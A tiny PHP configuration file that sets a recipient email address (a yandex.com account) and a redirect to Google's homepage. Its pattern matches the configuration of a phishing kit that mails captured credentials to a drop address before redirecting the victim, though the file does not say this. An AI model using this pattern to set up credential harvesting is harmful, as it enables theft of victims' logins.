<?php 
$Receive_email="marycandy1981@yandex.com";
$redirect="https://www.google.com/";
?>